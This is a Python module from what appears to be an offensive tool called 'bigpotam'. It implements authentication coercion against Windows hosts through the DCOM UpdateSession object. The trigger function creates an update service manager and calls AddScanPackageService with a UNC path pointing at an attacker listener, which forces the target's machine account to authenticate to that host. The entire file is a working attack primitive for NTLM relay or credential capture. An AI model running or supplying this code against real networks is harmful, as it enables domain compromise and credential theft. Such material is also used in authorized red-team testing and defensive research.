"""DCOM UpdateSession trigger function (machine account coercion)."""

import logging
import random
import string

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcom.oaut import (
    DISPATCH_METHOD,
    DISPPARAMS,
    IDispatch,
    IID_IDispatch,
    VARENUM,
    VARIANT,
    string_to_bin,
)
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL

log = logging.getLogger("bigpotam")

UPDATESESSION_CLSID = "4CB43D7F-7EEE-4906-8698-60DA1C38F2FE"


def _rnd(n=4):
    return "".join(random.choices(string.ascii_letters, k=n))


def _get_interface(dispatch, data):
    """Extract IDispatch interface from variant result."""
    from impacket.dcerpc.v5.dcomrt import (
        INTERFACE,
        OBJREF,
        OBJREF_CUSTOM,
        OBJREF_EXTENDED,
        OBJREF_HANDLER,
        OBJREF_STANDARD,
        FLAGS_OBJREF_CUSTOM,
        FLAGS_OBJREF_HANDLER,
        FLAGS_OBJREF_STANDARD,
        FLAGS_OBJREF_EXTENDED,
        IRemUnknown2,
    )

    objRef = OBJREF(b"".join(data))
    flags = cycleflags = objRef["flags"]

    if flags == FLAGS_OBJREF_CUSTOM:
        objRef = OBJREF_CUSTOM(b"".join(data))
    elif flags == FLAGS_OBJREF_HANDLER:
        objRef = OBJREF_HANDLER(b"".join(data))
    elif flags == FLAGS_OBJREF_STANDARD:
        objRef = OBJREF_STANDARD(b"".join(data))
    elif flags == FLAGS_OBJREF_EXTENDED:
        objRef = OBJREF_EXTENDED(b"".join(data))

    return IRemUnknown2(
        INTERFACE(
            dispatch.get_cinstance(),
            objRef,
        )
    )


def trigger_update_session(target, listener, username="", password="", domain="",
                           lmhash="", nthash="", do_kerberos=False, dc_host=None,
                           timeout=5, **kw):
    """DCOM UpdateSession.AddScanPackageService coercion (machine account).

    This method uses DCOM over port 135, not named pipes. Connection logic
    is entirely separate from all RPC methods.
    """
    dcom = None
    try:
        # Verify port 135 is reachable
        string_binding = r"ncacn_ip_tcp:%s[135]" % target
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_connect_timeout(timeout)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.disconnect()

        dcom = DCOMConnection(
            target, username, password, domain,
            lmhash, nthash, oxidResolver=True,
            doKerberos=do_kerberos, kdcHost=dc_host,
        )

        disp_params = DISPPARAMS(None, False)
        disp_params["rgvarg"] = NULL
        disp_params["rgdispidNamedArgs"] = NULL
        disp_params["cArgs"] = 0
        disp_params["cNamedArgs"] = 0

        iInterface = dcom.CoCreateInstanceEx(
            string_to_bin(UPDATESESSION_CLSID), IID_IDispatch,
        )
        iUpdateSession = IDispatch(iInterface)

        create_mgr_id = iUpdateSession.GetIDsOfNames(
            ("CreateUpdateServiceManager",)
        )[0]
        h_create_mgr = iUpdateSession.Invoke(
            create_mgr_id, 0x409, DISPATCH_METHOD, disp_params, 0, [], [],
        )

        iServiceMgr = IDispatch(
            _get_interface(
                iUpdateSession,
                h_create_mgr["pVarResult"]["_varUnion"]["pdispVal"]["abData"],
            )
        )

        add_scan_id = iServiceMgr.GetIDsOfNames(("AddScanPackageService",))[0]

        # Build UNC path with random share and filename
        tmp_share = _rnd()
        tmp_file = _rnd() + ".txt"
        unc_path = "\\\\%s\\%s\\%s" % (listener, tmp_share, tmp_file)

        disp_params2 = DISPPARAMS(None, False)
        disp_params2["rgdispidNamedArgs"] = NULL
        disp_params2["cArgs"] = 2
        disp_params2["cNamedArgs"] = 0

        arg0 = VARIANT(None, False)
        arg0["clSize"] = 5
        arg0["vt"] = VARENUM.VT_BSTR
        arg0["_varUnion"]["tag"] = VARENUM.VT_BSTR
        arg0["_varUnion"]["bstrVal"]["asData"] = "BIGPOTAM"

        arg1 = VARIANT(None, False)
        arg1["clSize"] = 5
        arg1["vt"] = VARENUM.VT_BSTR
        arg1["_varUnion"]["tag"] = VARENUM.VT_BSTR
        arg1["_varUnion"]["bstrVal"]["asData"] = unc_path

        # UpdateSession: UNC path is arg1 (first appended), service name is arg0
        disp_params2["rgvarg"].append(arg1)
        disp_params2["rgvarg"].append(arg0)

        iServiceMgr.Invoke(
            add_scan_id, 0x409, DISPATCH_METHOD, disp_params2, 0, [], [],
        )

        dcom.disconnect()
        return True

    except Exception as e:
        err = str(e)
        if "unknown error code: 0x0" in err:
            log.debug("DCOM UpdateSession: got expected 0x0 (success)")
            if dcom:
                try:
                    dcom.disconnect()
                except Exception:
                    pass
            return True
        elif "access_denied" in err:
            log.debug("DCOM UpdateSession: access denied")
        elif "REGDB_E_CLASSNOTREG" in err:
            log.debug("DCOM UpdateSession: class not registered")
        elif "CO_E_RUNAS_LOGON_FAILURE" in err:
            log.debug("DCOM UpdateSession: local admin but no interactive user")
        else:
            log.debug("DCOM UpdateSession: %s", e)

        if dcom:
            try:
                dcom.disconnect()
            except Exception:
                pass
        return False
